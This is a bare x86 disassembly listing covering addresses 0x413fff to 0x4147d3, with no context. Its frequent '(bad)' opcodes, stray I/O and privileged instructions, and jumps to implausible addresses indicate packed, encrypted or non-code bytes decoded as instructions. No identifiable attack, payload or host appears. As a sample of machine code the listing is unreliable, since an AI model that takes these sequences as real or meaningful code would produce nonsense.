  413fff:	ret    
  414000:	std    
  414001:	call   FWORD PTR [ebp+0x35]
  414004:	out    0x6f,al
  414006:	inc    eax
  414007:	(bad)  
  414008:	std    
  414009:	call   0x40546e
  41400e:	test   DWORD PTR [ecx+0xe],0xf5d55dff
  414015:	jmp    DWORD PTR [edi-0xff78c3d]
  41401b:	(bad)  
  41401d:	call   DWORD PTR [edi-0x600f4c3d]
  414023:	ret    
  414024:	std    
  414025:	call   0x40542e
  41402a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41402b:	mov    edx,ebp
  41402d:	div    DWORD PTR [edi+0x7751e6c3]
  414033:	(bad)  
  414034:	std    
  414035:	dec    DWORD PTR [ebp-0x33]
  414038:	out    0x4,eax
  41403a:	pop    es
  41403b:	(bad)  
  41403c:	std    
  41403d:	jmp    FWORD PTR [ebp-0x3f]
  414040:	out    0x6d,al
  414042:	xor    eax,DWORD PTR ds:0x3100ff00
  414048:	popf   
  414049:	pop    ebx
  41404a:	div    BYTE PTR [esi-0x36]
  41404d:	pop    ebx
  41404e:	xor    eax,0xc844c31e
  414053:	jae    0x414080
  414055:	add    dl,BYTE PTR [ebp-0x56]
  414058:	ret    
  414059:	add    bl,0x55
  41405c:	inc    ebp
  41405d:	add    ch,BYTE PTR [edx-0x16]
  414060:	loop   0x414030
  414062:	pop    es
  414063:	pop    ecx
  414064:	inc    edi
  414065:	push   ss
  414066:	(bad)  
  414067:	ds test al,0xbe
  41406a:	sti    
  41406b:	ss xchg esp,eax
  41406d:	cli    
  41406e:	addr16 hlt 
  414070:	sahf   
  414071:	sar    edi,0x27
  414074:	jle    0x414002
  414076:	inc    edi
  414077:	jo     0x41409b
  414079:	pop    edx
  41407a:	lea    edx,[edi]
  41407c:	sub    BYTE PTR [ebx-0x2],al
  41407f:	test   BYTE PTR [edx],bh
  414081:	fcmovb st,st(4)
  414083:	xchg   ebp,eax
  414084:	loope  0x414089
  414086:	push   0x80022233
  41408b:	or     edi,eax
  41408d:	inc    ebp
  41408e:	(bad)  
  41408f:	out    dx,al
  414090:	fiadd  DWORD PTR [ebx]
  414092:	add    dh,dl
  414094:	mov    eax,0xe14c04da
  414099:	add    ebp,DWORD PTR [eax+0x43]
  41409c:	cmc    
  41409d:	ret    0xcfff
  4140a0:	adc    eax,0xca27e7fc
  4140a5:	inc    esp
  4140a6:	(bad)  
  4140a7:	mov    esi,0xfe4815
  4140ac:	cmp    al,0x2a
  4140ae:	pop    edx
  4140af:	push   ebx
  4140b0:	pop    ebp
  4140b1:	pop    DWORD PTR [ebx-0x38]
  4140b4:	jae    0x4140e4
  4140b6:	add    dl,BYTE PTR [ebp-0x56]
  4140b9:	mov    es,WORD PTR [ecx+0x43bfd9c3]
  4140bf:	(bad)  
  4140c0:	mov    esp,0xf647ac09
  4140c5:	aaa    
  4140c6:	shl    edi,cl
  4140c8:	jg     0x414088
  4140ca:	loopne 0x414127
  4140cc:	mov    dl,BYTE PTR [ebx]
  4140ce:	jmp    0xf58a7ad6
  4140d3:	jle    0x414124
  4140d5:	or     ebp,ecx
  4140d7:	add    esi,DWORD PTR [esi-0x32]
  4140da:	xor    BYTE PTR [ebx],al
  4140dc:	xor    DWORD PTR [ecx],ecx
  4140de:	jmp    0x257e361f
  4140e3:	cld    
  4140e4:	inc    esi
  4140e5:	cmp    BYTE PTR [edx-0x7cf734fd],dl
  4140eb:	add    ecx,ebx
  4140ed:	or     BYTE PTR [esi+edi*4+0x22],bl
  4140f1:	fnstenv [ebx+0x7e]
  4140f4:	and    al,BYTE PTR [eax-0x3]
  4140f7:	inc    ebx
  4140f8:	outs   dx,BYTE PTR ds:[esi]
  4140f9:	cmp    BYTE PTR [ebx+0x4b],bh
  4140fc:	pop    ss
  4140fd:	mov    esi,0x12cc5aec
  414102:	jmp    0x548a7b0a
  414107:	or     DWORD PTR [eax],ecx
  414109:	arpl   dx,bp
  41410b:	add    esi,DWORD PTR [ecx]
  41410d:	mov    eax,ds:0x7100cc7a
  414112:	or     esi,eax
  414114:	mov    ecx,0xf5ed213a
  414119:	fbstp  TBYTE PTR [edi]
  41411b:	popa   
  41411c:	push   esp
  41411d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41411e:	lea    esi,[ebx+edi*1-0x29c7c831]
  414125:	into   
  414126:	(bad)  
  414128:	inc    edx
  414129:	mov    edi,0xbf346b81
  41412e:	aaa    
  41412f:	lea    ebp,[esi-0x4f485052]
  414135:	icebp  
  414136:	or     BYTE PTR [esi+0x79],bh
  414139:	mov    ?,WORD PTR [edi]
  41413b:	push   DWORD PTR [ebp-0xe]
  41413e:	ss je  0x414122
  414141:	pop    edx
  414142:	(bad)  
  414143:	xor    BYTE PTR [esi-0xe],ah
  414146:	add    BYTE PTR [ebp+ecx*2-0x3c01c8c6],0x32
  41414e:	mov    eax,ds:0x3775bc3d
  414153:	std    
  414154:	jl     0x414173
  414156:	aas    
  414157:	(bad)  
  414158:	ds repnz mov esp,0xf86e4107
  41415f:	(bad)  
  414160:	cs mov esp,0xf21ee78c
  414166:	ss imul ebp,ecx,0xa86cc08a
  41416d:	xor    bh,BYTE PTR [eax]
  41416f:	mov    ah,0x19
  414171:	push   0x37
  414173:	inc    BYTE PTR [esi]
  414175:	add    al,ch
  414177:	push   cs
  414178:	call   0xfe79674e
  41417d:	pusha  
  41417e:	test   al,0x2a
  414180:	imul   dh
  414182:	jae    0x414109
  414184:	test   ch,al
  414186:	dec    ebx
  414187:	aaa    
  414188:	(bad)  
  414189:	cmp    ebp,ecx
  41418b:	fld    TBYTE PTR [eax+ebp*1+0x2d]
  41418f:	ss mov ah,0xd9
  414192:	sub    esi,DWORD PTR [edi]
  414194:	inc    dh
  414196:	test   eax,0xe5f1e80e
  41419b:	aaa    
  41419c:	(bad)  
  41419d:	pusha  
  41419e:	test   eax,0x73aef656
  4141a3:	mov    al,ds:0xa5e610ff
  4141a8:	inc    eax
  4141a9:	jmp    0x9f30bf21
  4141ae:	jae    0x4141e7
  4141b0:	(bad)  
  4141b1:	adc    al,0x3d
  4141b3:	and    esp,ebp
  4141b5:	add    al,ch
  4141b7:	retf   
  4141b8:	std    
  4141b9:	mov    DWORD PTR ds:0x1ffff5d2,edx
  4141bf:	cdq    
  4141c0:	adc    eax,0x7
  4141c3:	retf   
  4141c4:	std    
  4141c5:	push   eax
  4141c6:	pusha  
  4141c7:	pusha  
  4141c8:	imul   eax,DWORD PTR [ecx-0x78],0xffffffcb
  4141cc:	mov    bl,0xf0
  4141ce:	xlat   BYTE PTR ds:[ebx]
  4141cf:	retf   0xfffd
  4141d2:	test   DWORD PTR [edx],eax
  4141d4:	call   0xfe0caaa6
  4141d9:	mov    DWORD PTR [eax],eax
  4141db:	aad    0xdd
  4141dd:	cmc    
  4141de:	call   FWORD PTR [edi]
  4141e0:	fs (bad) 
  4141e2:	mov    bh,BYTE PTR [bx+di+0x3f]
  4141e6:	add    BYTE PTR [edi],cl
  4141e8:	mov    cl,0xee
  4141ea:	neg    DWORD PTR [edi]
  4141ec:	retf   
  4141ed:	std    
  4141ee:	jne    0x414240
  4141f0:	loop   0x4141a2
  4141f2:	xor    BYTE PTR [edi],bh
  4141f4:	retf   
  4141f5:	xchg   DWORD PTR [ebp-0x20ca4],eax
  4141fb:	lea    eax,[ecx-0x37e0083e]
  414201:	dec    esi
  414202:	push   0x3f799d
  414207:	movsx  ebp,dh
  41420a:	neg    edi
  41420c:	(bad)  
  41420d:	std    
  41420e:	jne    0x414220
  414210:	loop   0x4141a2
  414212:	xor    bh,bh
  414214:	mov    DWORD PTR [edi-0x2105f7b],0x680d82ff
  41421e:	xchg   BYTE PTR [ebp+0x4a],ch
  414221:	(bad)  
  414222:	inc    BYTE PTR [ebp-0x3]
  414225:	cmc    
  414226:	dec    DWORD PTR [edi-0x5ff78c39]
  41422c:	outs   dx,DWORD PTR ds:[esi]
  41422d:	push   DWORD PTR cs:[ecx]
  414230:	lahf   
  414231:	mov    al,BYTE PTR [ecx+esi*2-0x4b01bf62]
  414238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414239:	jnp    0x414231
  41423b:	sahf   
  41423c:	mov    dh,0xd3
  41423e:	addr16 add bl,al
  414241:	or     al,0xc3
  414243:	dec    DWORD PTR [edi-0x7909cc04]
  414249:	scas   al,BYTE PTR es:[edi]
  41424a:	inc    eax
  41424b:	je     0x414276
  41424d:	fcomp  st(0)
  41424f:	das    
  414250:	jbe    0x414230
  414252:	mov    al,BYTE PTR [ebp+ebp*4-0x4d01bf22]
  414259:	mov    WORD PTR [edi],gs
  41425b:	neg    BYTE PTR [esi-0xa]
  41425e:	add    ecx,DWORD PTR [edi]
  414260:	lods   eax,DWORD PTR ds:[esi]
  414261:	out    0x3,al
  414263:	add    BYTE PTR [ecx],dh
  414265:	mov    ds:0xee3ecf7e,eax
  41426a:	inc    eax
  41426b:	inc    ebp
  41426d:	and    al,0x83
  41426f:	mov    esp,0xfe411679
  414274:	xor    DWORD PTR [ebx-0x7a],edx
  414277:	mov    al,0x31
  414279:	and    al,BYTE PTR [edx]
  41427b:	push   0xbd2f2231
  414280:	push   ss
  414281:	mov    dh,0x12
  414283:	call   0xfe808c53
  414288:	push   es
  414289:	xchg   esi,eax
  41428a:	cs idiv dh
  41428d:	push   ebx
  41428e:	aas    
  41428f:	je     0x4142b2
  414291:	dec    edx
  414292:	adc    BYTE PTR [edx],ch
  414294:	out    dx,al
  414295:	inc    ebx
  414296:	aas    
  414297:	mov    ah,0xd9
  414299:	jae    0x4142da
  41429b:	(bad)  
  41429c:	fdivp  st(5),st
  41429e:	adc    ebp,eax
  4142a0:	xor    DWORD PTR [eax],ecx
  4142a2:	inc    ecx
  4142a3:	inc    BYTE PTR [eax]
  4142a5:	into   
  4142a6:	mov    ebp,0x9c6f626
  4142ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142ac:	inc    eax
  4142ad:	inc    ebp
  4142ae:	sbb    DWORD PTR [ecx-0x6acbf6cb],edx
  4142b4:	inc    eax
  4142b5:	in     eax,0x55
  4142b7:	xchg   ebp,eax
  4142b8:	inc    eax
  4142b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142ba:	xor    al,0x3b
  4142bc:	and    esp,DWORD PTR [edi+0x1d407d34]
  4142c2:	sbb    DWORD PTR [ecx+0x6d345975],eax
  4142c8:	inc    eax
  4142c9:	mov    ebp,0x7f405d51
  4142ce:	xor    al,0xd3
  4142d0:	adc    ecx,DWORD PTR [ecx+0x6f40ff59]
  4142d6:	xor    al,0x93
  4142d8:	push   ebx
  4142d9:	pop    edi
  4142da:	xor    al,0x45
  4142dc:	inc    eax
  4142dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142de:	pop    ebp
  4142df:	xor    eax,0xbb345740
  4142e4:	adc    ebx,DWORD PTR [ecx-0x67]
  4142e7:	inc    DWORD PTR [eax+0x47]
  4142ea:	xor    al,0x5b
  4142ec:	dec    edi
  4142ed:	inc    edi
  4142ee:	xor    al,0x1d
  4142f0:	inc    eax
  4142f1:	mov    ebp,0x59710118
  4142f6:	xor    al,0xd
  4142f8:	inc    eax
  4142f9:	fisttp QWORD PTR [ebp+edi*8+0x3f]
  4142fd:	pop    ds
  4142fe:	xor    al,0x33
  414300:	dec    ebx
  414301:	pop    ds
  414302:	xor    al,0xf5
  414304:	aas    
  414305:	test   DWORD PTR [ecx],ebx
  414307:	add    DWORD PTR [ecx-0x1acba700],esi
  41430d:	aas    
  41430e:	lds    ecx,FWORD PTR [eax-0x2b]
  414311:	aas    
  414312:	div    DWORD PTR [ebx]
  414314:	pop    ebx
  414315:	adc    al,0xd9
  414317:	test   bh,bh
  414319:	ds out 0x33,eax
  41431c:	jnp    0x41439a
  41431e:	out    0x33,eax
  414320:	mov    ebp,0xff749d3f
  414325:	mov    ebp,0x34fe330e
  41432a:	sbb    eax,0xffd04b21
  41432f:	xor    bh,dh
  414331:	adc    al,0x1d
  414333:	xor    al,0xb4
  414335:	cdq    
  414336:	xor    di,si
  414339:	mov    gs,eax
  41433b:	or     ebp,eax
  41433d:	imul   esi,eax,0x32
  414340:	(bad)  
  414341:	jle    0x41435b
  414343:	and    al,0xf6
  414345:	jbe    0x414395
  414347:	sub    al,0x48
  414349:	mov    ebp,0x9cfe3347
  41434e:	inc    ecx
  41434f:	cmp    edi,esi
  414351:	pop    esi
  414352:	inc    ebp
  414353:	imul   BYTE PTR [ebx]
  414355:	push   esi
  414356:	xor    esi,DWORD PTR cs:[ecx+eax*2+0x51fe331e]
  41435e:	(bad)  
  41435f:	(bad)  
  414361:	ds push ss
  414363:	jge    0x414348
  414365:	ds push cs
  414367:	xor    esp,edi
  414369:	add    DWORD PTR [ecx+0x32],eax
  41436c:	(bad)  
  41436d:	add    BYTE PTR es:[eax-0x9e109ad],bh
  414374:	sub    ebx,DWORD PTR [eax*8+0x54fe336f]
  41437b:	test   DWORD PTR [ebx],edi
  41437d:	inc    BYTE PTR [esi]
  41437f:	dec    ebp
  414380:	sbb    BYTE PTR [esi+edi*8],ch
  414383:	push   edi
  414384:	xor    esi,DWORD PTR [ebp+ebx*1+0x1fe3346]
  41438b:	cs in  eax,0xfe
  41438e:	out    0x3f,al
  414390:	jge    0x41435d
  414392:	(bad)  
  414393:	aaa    
  414394:	xor    esp,edi
  414396:	aad    0xdb
  414398:	xor    edi,esi
  41439a:	into   
  41439b:	imul   ecx,DWORD PTR [edx-0xa],0xe6f3f700
  4143a2:	icebp  
  4143a3:	inc    ebx
  4143a4:	repnz std 
  4143a6:	dec    DWORD PTR [ebp-0x3a]
  4143a9:	cmc    
  4143aa:	call   DWORD PTR [edi-0x68d41b22]
  4143b0:	repz std 
  4143b2:	mov    ch,0x54
  4143b4:	sti    
  4143b5:	std    
  4143b6:	push   DWORD PTR [eax-0x4800d631]
  4143bc:	repz inc ebx
  4143be:	clc    
  4143bf:	rcr    DWORD PTR [esi],0xfb
  4143c2:	call   DWORD PTR [edi]
  4143c4:	repz jae 0x4143c3
  4143c7:	mov    al,0xfb
  4143c9:	adc    eax,0xc0c59800
  4143ce:	or     al,0x88
  4143d0:	push   ecx
  4143d1:	mov    esp,ebp
  4143d3:	add    BYTE PTR [ebx],cl
  4143d5:	retf   0x6afa
  4143d8:	pop    eax
  4143d9:	pusha  
  4143da:	pop    edx
  4143db:	(bad)  
  4143dc:	jge    0x4143dc
  4143de:	out    0xed,eax
  4143e0:	inc    eax
  4143e1:	repnz std 
  4143e3:	mov    DWORD PTR [ebp+0x5075fdf2],ecx
  4143e9:	pop    esi
  4143ea:	sbb    ch,BYTE PTR [ebp-0x67]
  4143ed:	push   es
  4143ee:	push   DWORD PTR ds:0x3f3dde
  4143f4:	and    cl,bl
  4143f6:	cli    
  4143f7:	inc    DWORD PTR [edi-0xd]
  4143fa:	jae    0x414404
  4143fc:	mov    al,0x11
  4143fe:	ins    DWORD PTR es:[edi],dx
  4143ff:	inc    ecx
  414400:	or     BYTE PTR [esi+0x0],bl
  414403:	add    BYTE PTR [eax],cl
  414405:	xchg   dh,ah
  414407:	mov    ebx,0xfffdf404
  41440c:	jge    0x414400
  41440e:	std    
  41440f:	jne    0x414411
  414411:	fdivp  st(6),st
  414413:	sub    bh,dl
  414415:	repz mov edx,0x55022431
  41441c:	mov    edx,0xddc38073
  414421:	xlat   BYTE PTR ds:[ebx]
  414422:	add    eax,DWORD PTR [eax]
  414424:	(bad)  
  414425:	mov    cl,0xab
  414427:	sahf   
  414428:	pop    esp
  414429:	loope  0x41442e
  41442b:	(bad)  
  41442c:	cmp    al,0x54
  41442e:	cmp    esi,DWORD PTR [ecx+ebp*1-0x68]
  414432:	(bad)  
  414433:	push   ebx
  414434:	mov    dh,0x92
  414436:	stos   DWORD PTR es:[edi],eax
  414437:	add    BYTE PTR [eax],al
  414439:	xor    DWORD PTR [ebx+0x34da677d],ecx
  41443f:	sar    edi,0x9f
  414442:	xor    al,0xe
  414444:	call   FWORD PTR [eax+edi*1]
  414447:	sub    bh,BYTE PTR [edi]
  414449:	in     eax,0xba
  41444b:	cmp    al,0xfe
  41444d:	cld    
  41444e:	push   ebx
  41444f:	sub    ah,BYTE PTR [ebp+0xa3cab41]
  414455:	jno    0x4144b2
  414457:	cmc    
  414458:	mov    ah,dh
  41445a:	fld    TBYTE PTR [ebx+0x7df266ff]
  414460:	addr16 mov esi,0x57ffc15c
  414466:	jl     0x4144a6
  414468:	inc    ah
  41446a:	daa    
  41446b:	sub    bl,BYTE PTR [ebx]
  41446d:	fucom  st(2)
  41446f:	cmp    al,0x67
  414471:	xor    BYTE PTR [eax],ah
  414473:	sub    edi,DWORD PTR [ebp+0x40aed6c9]
  414479:	xor    DWORD PTR [edi],edx
  41447b:	mov    bh,0xfb
  41447d:	es xchg esi,eax
  41447f:	or     ch,al
  414481:	mov    ?,WORD PTR ss:[ebx]
  414484:	(bad)  
  414485:	push   ss
  414486:	mov    dh,0x3e
  414488:	out    0x3c,eax
  41448a:	dec    ebx
  41448b:	cmp    edi,esi
  41448d:	clc    
  41448e:	in     al,0xb
  414490:	add    BYTE PTR [ecx+ecx*1+0x72],ah
  414494:	das    
  414495:	mov    bl,0x45
  414497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414498:	test   eax,0xadeaa8ee
  41449d:	add    BYTE PTR [ecx+0x9],dh
  4144a0:	inc    ecx
  4144a1:	dec    edx
  4144a2:	dec    ebp
  4144a3:	retf   0x3ce8
  4144a6:	pop    ebp
  4144a7:	std    
  4144a8:	rol    BYTE PTR [edi+ebx*1],1
  4144ab:	xor    BYTE PTR [ebp-0x294a0ef8],dh
  4144b1:	mov    dh,BYTE PTR [ebp+0x2d]
  4144b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144b5:	mov    dh,0xba
  4144b7:	xor    BYTE PTR [ebx],dl
  4144b9:	or     al,0x99
  4144bb:	rcl    BYTE PTR [ebp+0x1330a73c],1
  4144c1:	inc    eax
  4144c2:	xchg   esi,eax
  4144c3:	push   esi
  4144c4:	sar    BYTE PTR [edi+edx*4],cl
  4144c7:	mov    ds:0x9f22abe8,eax
  4144cc:	daa    
  4144cd:	add    al,0x19
  4144cf:	inc    ebx
  4144d0:	sti    
  4144d1:	ret    0x2f7e
  4144d4:	fisttp DWORD PTR [edi]
  4144d6:	mov    DWORD PTR [edx+0xb],edx
  4144d9:	cmp    eax,0xb729046f
  4144de:	cmp    al,0x82
  4144e0:	mov    ds:0x44b65f3f,eax
  4144e5:	cmp    al,0xdd
  4144e7:	add    BYTE PTR [ecx-0xe],dl
  4144ea:	dec    edi
  4144eb:	xor    BYTE PTR ds:0x402cbd3c,dh
  4144f1:	or     BYTE PTR fs:[eax],dh
  4144f4:	and    eax,0xc3a836a9
  4144f9:	lods   eax,DWORD PTR ds:[esi]
  4144fa:	jno    0x414505
  4144fc:	and    DWORD PTR [ebx],0x3ce8ca95
  414502:	add    BYTE PTR [ebp+0x456810fd],ah
  414508:	xor    ch,bh
  41450a:	pop    es
  41450b:	icebp  
  41450c:	mov    ah,0xff
  41450e:	fidivr WORD PTR [ebx-0x3b11043c]
  414514:	xor    edi,esi
  414516:	pop    esp
  414517:	and    eax,0x2ade0221
  41451c:	das    
  41451d:	(bad)  
  41451e:	pop    esp
  41451f:	sub    DWORD PTR [eax],ebp
  414521:	js     0x414526
  414523:	sbb    ch,BYTE PTR [edi]
  414525:	mov    WORD PTR [ecx+eiz*1],gs
  414528:	shl    BYTE PTR [edi-0x22],0x98
  41452c:	enter  0x40ff,0xd
  414530:	popf   
  414531:	inc    eax
  414532:	jmp    0x914cfa32
  414537:	jbe    0x414515
  414539:	(bad)  
  41453a:	sahf   
  41453b:	ds dec ecx
  41453d:	jae    0x41454f
  41453f:	mov    ah,0xc4
  414541:	imul   DWORD PTR [edx-0x28]
  414544:	cmp    eax,DWORD PTR [ebx]
  414546:	cld    
  414547:	retf   0x4482
  41454a:	cmp    DWORD PTR [esi-0x6c26c4d1],0x31f7fe2f
  414554:	jno    0x414565
  414556:	push   cs
  414557:	sub    eax,0x22a48909
  41455c:	and    ecx,DWORD PTR [ebx+0x56]
  41455f:	mov    al,ds:0x88fc671f
  414564:	enter  0x73ff,0x0
  414568:	jo     0x4145b1
  41456a:	dec    edi
  41456b:	push   ecx
  41456c:	jl     0x414583
  41456e:	add    cl,ch
  414570:	scas   eax,DWORD PTR es:[edi]
  414571:	dec    ebx
  414572:	or     ebx,DWORD PTR [eax+esi*2+0x4b]
  414576:	dec    edi
  414577:	je     0x4145e9
  414579:	inc    edi
  41457a:	dec    edi
  41457b:	xchg   ecx,eax
  41457c:	push   edx
  41457d:	popf   
  41457e:	inc    eax
  41457f:	jmp    0x14cfaef
  414584:	or     bl,dh
  414586:	inc    BYTE PTR [eax]
  414588:	das    
  414589:	(bad)  
  41458a:	mov    edi,0x437dec74
  41458f:	cld    
  414590:	fwait
  414591:	jo     0x414555
  414593:	add    eax,DWORD PTR [esi+0xc75feff]
  414599:	hlt    
  41459a:	jae    0x4145a4
  41459c:	add    BYTE PTR [esi-0xc000004],al
  4145a2:	jae    0x4145a0
  4145a4:	lock sti 
  4145a6:	daa    
  4145a7:	(bad)  
  4145a8:	out    dx,eax
  4145a9:	repz dec ebx
  4145ab:	lock pop ebx
  4145ad:	jno    0x41459d
  4145af:	add    BYTE PTR ds:0x8075fda3,al
  4145b5:	loop   0x41459b
  4145b7:	sub    DWORD PTR [edi-0x5f3d380d],ecx
  4145bd:	or     dl,BYTE PTR [ebp-0x75]
  4145c0:	lods   al,BYTE PTR ds:[esi]
  4145c1:	xchg   edx,eax
  4145c3:	cld    
  4145c4:	xor    al,BYTE PTR ds:0x79af5d6a
  4145ca:	push   es
  4145cb:	call   0xfd6cc5d0
  4145d0:	call   DWORD PTR [ecx]
  4145d2:	dec    ecx
  4145d3:	cli    
  4145d4:	push   0xbeef0a88
  4145d9:	pusha  
  4145da:	xchg   ebx,eax
  4145db:	imul   eax,DWORD PTR [ecx+0x58],0x62
  4145df:	mov    ch,0x6d
  4145e1:	cdq    
  4145e2:	or     bh,bh
  4145e4:	jne    0x414636
  4145e6:	loop   0x4145d9
  4145e8:	push   edx
  4145e9:	out    dx,eax
  4145ea:	repnz add WORD PTR [eax-0x1d],bx
  4145ef:	mov    esp,0x3f61b368
  4145f4:	add    BYTE PTR [eax-0x45],dh
  4145f7:	imul   eax,DWORD PTR [ecx+0x48],0xfffffff3
  4145fb:	jae    0x414605
  4145fd:	inc    eax
  4145fe:	(bad)  
  4145ff:	push   eax
  414600:	push   DWORD PTR [ecx]
  414602:	pop    ss
  414603:	stos   DWORD PTR es:[edi],eax
  414604:	call   FWORD PTR [esi]
  414606:	das    
  414607:	ja     0x414670
  414609:	mov    dh,0x94
  41460b:	ret    
  41460c:	call   DWORD PTR [esi+0x3140a7e0]
  414612:	aaa    
  414613:	scas   al,BYTE PTR es:[edi]
  414614:	pop    es
  414615:	or     ebp,esp
  414617:	aam    0xfe
  414619:	not    bh
  41461b:	add    al,BYTE PTR [eax]
  41461d:	fimul  WORD PTR [ebp-0x1eab5555]
  414623:	add    ebp,DWORD PTR [eax-0xf]
  414626:	in     al,dx
  414627:	ret    0xd7ff
  41462a:	in     al,dx
  41462b:	or     ebp,eax
  41462d:	lahf   
  41462e:	adc    DWORD PTR [ecx],edi
  414630:	inc    BYTE PTR [eax]
  414632:	(bad)  
  414633:	sub    al,0x70
  414635:	inc    edi
  414636:	jo     0x414658
  414638:	aaa    
  414639:	je     0x414664
  41463b:	cwde   
  41463c:	(bad)  
  41463e:	scas   al,BYTE PTR es:[edi]
  41463f:	mov    gs,WORD PTR [ebx-0x7ddfceff]
  414645:	(bad)  
  414646:	and    al,0x28
  414648:	sub    cl,BYTE PTR [edi+edx*4-0x7a]
  41464c:	cmp    dh,bh
  41464e:	add    al,0xac
  414650:	cmp    BYTE PTR [ecx+edi*1-0x78],dh
  414654:	dec    edx
  414655:	and    eax,0xc14a9e7e
  41465a:	sub    eax,0x5d8acd20
  41465f:	mov    ds:0x4c66fb3f,al
  414664:	push   cs
  414665:	jmp    esp
  414667:	das    
  414668:	sub    dl,BYTE PTR [edi+0xa38c718]
  41466e:	jno    0x4146e3
  414670:	icebp  
  414671:	mov    ah,ch
  414673:	repz cmp BYTE PTR [ecx+ebx*1-0x21],dh
  414678:	scas   al,BYTE PTR es:[edi]
  414679:	pop    es
  41467a:	dec    ecx
  41467b:	or     BYTE PTR [edi+ebx*8],bh
  41467e:	das    
  41467f:	sub    eax,0x2c3aaf1d
  414684:	fwait
  414685:	or     ecx,DWORD PTR [ecx]
  414687:	faddp  st(6),st
  414689:	cmp    BYTE PTR [edi],dl
  41468b:	sub    eax,0xb70f377b
  414690:	lock sub edx,DWORD PTR [ecx-0x1d]
  414694:	cmc    
  414695:	cmp    BYTE PTR [eax],al
  414697:	push   DWORD PTR [esi-0x1dd3d414]
  41469d:	in     eax,0x38
  41469f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146a0:	or     ch,cl
  4146a2:	add    esi,DWORD PTR [ecx]
  4146a4:	inc    edx
  4146a5:	stos   BYTE PTR es:[edi],al
  4146a6:	rdtsc  
  4146a8:	(bad)  
  4146a9:	popa   
  4146aa:	daa    
  4146ab:	mov    bl,0x45
  4146ad:	rcl    al,0x64
  4146b0:	fcom   DWORD PTR [ecx]
  4146b2:	pop    ebp
  4146b3:	xchg   esi,esi
  4146b5:	inc    esi
  4146b6:	ret    
  4146b7:	mov    esi,0x6638237d
  4146bc:	aam    0xa5
  4146be:	scas   al,BYTE PTR es:[edi]
  4146bf:	ds sub al,0x13
  4146c2:	or     BYTE PTR [ecx-0x60c73eca],bl
  4146c8:	add    BYTE PTR [ecx+0x10d938af],ch
  4146ce:	add    al,0x31
  4146d0:	sbb    al,0x3e
  4146d2:	cmp    ch,bh
  4146d4:	sub    al,0x18
  4146d6:	sar    DWORD PTR [edi-0x4a],1
  4146d9:	loopne 0x414706
  4146db:	imul   DWORD PTR [ebx]
  4146dd:	cmp    BYTE PTR gs:[ebx],bh
  4146e0:	push   ecx
  4146e1:	push   eax
  4146e2:	js     0x4146f2
  4146e4:	sub    al,0x55
  4146e6:	aaa    
  4146e7:	and    ecx,DWORD PTR [ecx-0x71]
  4146ea:	cmp    BYTE PTR [edi+0x2c],dl
  4146ed:	inc    ebp
  4146ee:	xor    eax,0xaee5f19c
  4146f3:	jb     0x414761
  4146f5:	jmp    DWORD PTR [eax+0x5bffc989]
  4146fb:	add    BYTE PTR [edi+0x30],dh
  4146fe:	dec    edi
  4146ff:	mov    esi,0x1e0fb569
  414704:	xlat   BYTE PTR ds:[ebx]
  414705:	jmp    edi
  414707:	pop    ebp
  414708:	or     eax,0x72e2fe2b
  41470d:	mov    eax,0xc4bb992f
  414712:	not    DWORD PTR [ecx+0x37ef092d]
  414718:	cmp    DWORD PTR [ebp-0x1b05fef9],esi
  41471e:	(bad)  
  41471f:	out    0xfe,al
  414721:	sub    dh,BYTE PTR [ecx+esi*8+0x1a]
  414725:	cdq    
  414726:	and    al,0xd6
  414728:	sub    esi,DWORD PTR es:[ebp+ecx*8+0x1e]
  41472d:	mov    ch,0xf7
  41472f:	mov    BYTE PTR [eax-0x2fe917fd],0x2a
  414736:	inc    cl
  414738:	mov    ah,bl
  41473a:	(bad)  
  41473b:	scas   al,BYTE PTR es:[edi]
  41473c:	mov    dl,0x3e
  41473e:	add    BYTE PTR [ebp-0x6147945e],ah
  414744:	pop    esi
  414745:	sub    edi,esi
  414747:	fwait
  414748:	pop    ss
  414749:	hlt    
  41474a:	push   es
  41474b:	adc    al,0xf
  41474d:	imul   edx,DWORD PTR [edi-0x74d48bea],0x24
  414754:	dec    ecx
  414755:	mov    esp,0xfbc07656
  41475a:	(bad)  
  41475b:	hlt    
  41475c:	and    DWORD PTR cs:[edx+edx*1+0x0],ebx
  414761:	sub    ecx,DWORD PTR es:[edx]
  414764:	sub    DWORD PTR [ecx+0x25624fd1],esp
  41476a:	xchg   DWORD PTR [ebp+ecx*2+0x2c],edi
  41476e:	mov    bl,0x4b
  414770:	add    al,bl
  414772:	xor    bh,bh
  414774:	je     0x4147c8
  414776:	ins    DWORD PTR es:[edi],dx
  414777:	std    
  414778:	dec    ebp
  414779:	add    al,0x5d
  41477b:	(bad)  
  41477c:	push   edi
  41477e:	mov    dl,0xfd
  414780:	jne    0x4147d6
  414782:	cmp    edx,DWORD PTR [ebp-0x1]
  414785:	mov    ebp,0x46d6e7fe
  41478a:	repnz std 
  41478c:	or     esp,DWORD PTR [eax-0x22]
  41478f:	sub    eax,DWORD PTR [eax+0x287508f6]
  414795:	into   
  414796:	repz dec ebx
  414798:	cld    
  414799:	mov    dl,0x6
  41479b:	lea    eax,[ebp+0x4]
  41479e:	push   edi
  41479f:	push   esp
  4147a0:	call   0x3e9cfe
  4147a5:	jecxz  0x41476d
  4147a7:	jb     0x4147bd
  4147a9:	jo     0x4147b2
  4147ab:	add    bh,ch
  4147ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147ae:	repz jae 0x4147ad
  4147b1:	cs cmp bh,ch
  4147b4:	jne    0x414776
  4147b6:	fisub  WORD PTR [ebp+0x9f387fe]
  4147bc:	fdiv   st,st(0)
  4147be:	or     esp,DWORD PTR [esi]
  4147c0:	call   edi
  4147c2:	repnz xor eax,eax
  4147c5:	add    BYTE PTR [ecx],dl
  4147c7:	repz std 
  4147c9:	inc    edi
  4147cb:	clc    
  4147cc:	lods   al,BYTE PTR ds:[esi]
  4147cd:	cmp    BYTE PTR [edi+0x61bf8279],cl
  4147d3:	arpl   WORD PTR [edi],di
